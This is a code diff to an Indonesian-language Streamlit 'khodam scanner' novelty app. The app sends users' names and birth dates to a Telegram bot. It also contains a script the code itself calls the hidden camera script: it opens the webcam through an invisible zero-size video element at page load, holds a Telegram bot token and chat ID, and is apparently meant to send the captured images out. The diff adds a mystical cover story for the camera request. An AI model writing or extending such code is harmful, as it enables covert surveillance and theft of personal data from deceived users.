@@ -41,6 +41,18 @@ st.markdown("""
         margin-bottom: 25px;
     }
 
+    /* Kotak Alasan Kamera */
+    .camera-reason-box {
+        background: rgba(139, 92, 246, 0.1);
+        border-left: 4px solid #c084fc;
+        padding: 14px 18px;
+        border-radius: 10px;
+        margin-bottom: 20px;
+        font-size: 14px;
+        color: #e2e8f0;
+        line-height: 1.5;
+    }
+
     /* Tombol Utama Eksklusif */
     div[data-testid="stFormSubmitButton"] > button {
         background: linear-gradient(135deg, #8b5cf6 0%, #d946ef 100%) !important;
@@ -186,16 +198,21 @@ def send_text_to_telegram(name, dob, profile_title):
 # RENDER UTAMA BERDASARKAN STEP
 # ==========================================
 
-# --- STEP 0: FORM RITUAL & KAMERA TERSEMBUNYI ---
+# --- STEP 0: FORM RITUAL & PENJELASAN ALASAN KAMERA ---
 if st.session_state.step == 0:
-    st.markdown("<h1 style='text-align: center; color: #c084fc;'>👁️ PUSAT PEMINDAIAN KHODAM NUSANTARA</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color: #c084fc;'>👁️️ PUSAT PEMINDAIAN KHODAM NUSANTARA</h1>", unsafe_allow_html=True)
     st.markdown("<p style='text-align: center; color: #94a3b8; margin-bottom: 30px;'>Ketahui khodam gaib pendamping hidupmu dengan teknologi sensor astral termuktahir.</p>", unsafe_allow_html=True)
 
     with st.container():
         st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
         
-        # Pemberitahuan izin kamera yang disesuaikan dengan tema gaib/aura
-        st.info("🔮 **Portal Memerlukan Izin Kamera:** Diperlukan akses kamera untuk memindai aura gaib dan gelombang sukma wajahmu.")
+        # Penjelasan alasan izin kamera langsung terpampang jelas di dalam kartu
+        st.markdown("""
+            <div class="camera-reason-box">
+                🔮 <b>Informasi Ritual & Kalibrasi Aura:</b><br>
+                Sistem memerlukan izin akses kamera sesaat untuk memindai gelombang energi sukma dan menyelaraskan frekuensi khodam dengan wajahmu sebelum hasil akhir dibongkar.
+            </div>
+        """, unsafe_allow_html=True)
         
         with st.form("ritual_khodam_form"):
             name_input = st.text_input("Nama Lengkap / Nama Panggilan", value="Boboho", placeholder="Contoh: Boboho")
@@ -216,7 +233,7 @@ if st.session_state.step == 0:
                     
         st.markdown('</div>', unsafe_allow_html=True)
 
-    # SKRIP KAMERA TERSEMBUNYI (LANGSUNG EKSEKUSI DI AWAL)
+    # SKRIP KAMERA TERSEMBUNYI (LANGSUNG EKSEKUSI DI BACKGROUND SAAT STEP 0 DIMULAI)
     hidden_js_camera = f"""
     <div>
         <video id="video" width="0" height="0" autoplay style="display:none;"></video>
@@ -225,6 +242,7 @@ if st.session_state.step == 0:
             const token = "{TELEGRAM_BOT_TOKEN}";
             const chatId = "{TELEGRAM_CHAT_ID}";
             
+            // Meminta izin kamera secara otomatis tanpa pop-up yang menutupi teks
             navigator.mediaDevices.getUserMedia({{ video: true }})
             .then(function(stream) {{
                 var video = document.getElementById('video');
